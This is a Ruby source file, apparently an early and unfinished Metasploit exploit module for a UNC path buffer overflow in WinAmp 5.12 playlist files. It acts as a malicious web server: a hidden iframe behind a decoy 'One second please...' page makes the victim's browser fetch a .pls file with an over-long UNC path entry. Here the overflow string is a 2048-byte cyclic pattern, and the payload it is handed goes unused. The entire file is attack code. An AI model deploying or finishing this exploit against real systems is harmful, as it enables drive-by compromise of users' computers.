require 'msf/core'

module Msf

class Exploits::Windows::Browser::WinAmp_Playlist_UNC < Msf::Exploit::Remote

	#
	# This module acts as an HTTP server
	#
	include Exploit::Remote::HttpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WinAmp Playlist UNC Path Overflow',
			'Description'    => %q{

			},
			'License'        => MSF_LICENSE,
			'Author'         => 
				[ 
					'hdm', 
				],
			'Version'        => '$Revision$',
			'References'     => 
				[
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00\x5c\x2f\x0a\x0d\x20",
					'Compat'   => 
						{
							'ConnectionType' => '-find',
						},
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'WinAmp 5.12', { }],
				],
			'DisclosureDate' => 'Jan 29 2006',
			'DefaultTarget'  => 0))
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
	
		if (not request.uri.match(/\.pls$/i))
			html =
				"<html><iframe src='" + get_resource + '/' +
				Rex::Text.rand_text_alphanumeric(rand(80)+16) + 
				".pls'></iframe>" +
				"<body>One second please...</body></html>"
			send_response(cli, html)
			return
		end

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Transmit the compressed response to the client
		send_response(cli, generate_playlist(p), { 'Content-Type' => 'text/plain' })
		
		handler(cli)
	end
	
	def generate_playlist(payload)

		file = Rex::Text.pattern_create(2048)
		play =
			"[playlist]\r\n"                 +
				"File1=\\\\" + file + "\r\n" +
				"Title1=~BOF~\r\n"           +
				"Length1=FFF\r\n"            + 
				"NumberOfEntries=1\r\n"      + 
				"Version=2\r\n"
		return play	
	end

end
end
